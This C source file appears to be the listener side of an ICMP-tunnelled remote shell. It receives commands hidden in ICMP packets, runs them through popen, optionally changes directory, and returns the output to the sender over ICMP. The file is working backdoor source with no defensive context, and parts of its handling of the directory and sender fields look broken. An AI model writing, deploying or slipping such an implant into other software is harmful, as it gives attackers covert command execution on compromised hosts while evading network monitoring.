#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <stdint.h>
#include <string.h>
#include <linux/if_packet.h>
#include <fcntl.h>
#include <pthread.h>
#include "util.h"


char *handle_dir(char *dir) {
    char *cwd = (char *)malloc(MAX_DIR_SIZE);
    dir[strlen(dir) - 1] = '\0';
    if (strlen(dir) > 0) {
        if (chdir(dir) == -1) {
            //
        }
    }
    getcwd(cwd, MAX_DIR_SIZE);
    return cwd;
    }

void icmp_listener_callback(struct PACKET *upstream_packet, in_addr_t src_addr, int sockfd) {
    int stream_size;
    char *effective_dir;
    struct PACKET packet;
    unsigned char data[DATA_SIZE];
    if (upstream_packet->sender == CLIENT_MES){
        effective_dir = handle_dir(upstream_packet->dir);
        strncpy(packet.dir, effective_dir, strlen(effective_dir));
        free (effective_dir);
        memset(data, 0, DATA_SIZE);
        memset(packet.content, 0, DATA_SIZE);
        memset(packet.dir, 0, MAX_DIR_SIZE);

        if (strnlen(upstream_packet->content, DATA_SIZE) > 0) {
            FILE *fp = popen(upstream_packet->content, "r");

            if (fp == NULL) {
                perror("popen() failed");
                exit(EXIT_FAILURE);
            };

            fread(packet.content, sizeof(char), DATA_SIZE, fp);

            if (pclose(fp) == -1) {
                perror("pclose() failed");
                exit(EXIT_FAILURE);
            }
        } else {
            packet.sender = SERVER_MES;
            strncpy(packet.content, "", DATA_SIZE);
        }
        icmp_send(sockfd, (struct in_addr *)&src_addr, &packet);
    }
}

int main() {
    icmp_listener(icmp_listener_callback);
}

